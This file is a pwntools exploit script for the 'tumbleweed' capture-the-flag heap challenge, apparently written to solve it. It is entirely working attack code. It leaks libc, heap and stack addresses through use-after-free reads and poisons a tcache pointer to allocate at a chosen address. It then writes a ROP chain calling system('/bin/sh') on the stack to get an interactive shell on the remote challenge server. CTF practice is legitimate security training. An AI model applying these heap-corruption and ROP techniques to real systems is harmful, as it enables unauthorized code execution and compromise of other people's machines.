from pwn import *
from icecream import ic

elf = exe = ELF("./tumbleweed_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("tumbleweed.chal.pwni.ng", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def grow(inc, size, heaptype, label):
    sla("> ", "0")
    sla("Which incubator? ", str(inc))
    sla("Size? ", str(size))
    sla("> ", str(heaptype))
    sla("Label: ", label)

def burn(inc, heaptype):
    sla("> ", "1")
    sla("Which incubator? ", str(inc))
    sla("> ", str(heaptype))

def inspect(inc):
    sla("> ", "2")
    sla("Which incubator? ", str(inc))

def resize(inc, size, heaptype):
    sla("> ", "3")
    sla("Which incubator? ", str(inc))
    sla("Target size: ", str(size))
    sla("> ", str(heaptype))

grow(0, 0x600, 0, b"potato")
grow(1, 0x300, 0, b"test")
grow(2, 0x300, 0, b"test2")



resize(0, 0, 0)

inspect(0)

libc.address = uu64(6) - 0x21ace0

resize(1, 0, 0)
resize(2, 0, 0)

inspect(1)

heap = uu64(4) << 12
ic(hex(heap))


burn(1, 2)
burn(2, 2)

target = 0x1008440
grow(1, 0x300, 2, p64((target) ^ (heap>>12)))

grow(3, 0x300, 0, b'a')
grow(4, 0x300, 0, b'a'*0x8 + p64(0) + p64(0x00000000010083c8) + p64(0x1000))

inspect(4)
re(0x30)
stack = uu64(8) - 0x120

ic(hex(stack))

grow(5, 0x100, 3, b'\x00'*(0x88) + p64(stack))
payload = p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(qgad(libc, "rdi")+1)
payload += p64(libc.sym['system'])
grow(6, 0x100, 3, payload)


io.interactive()
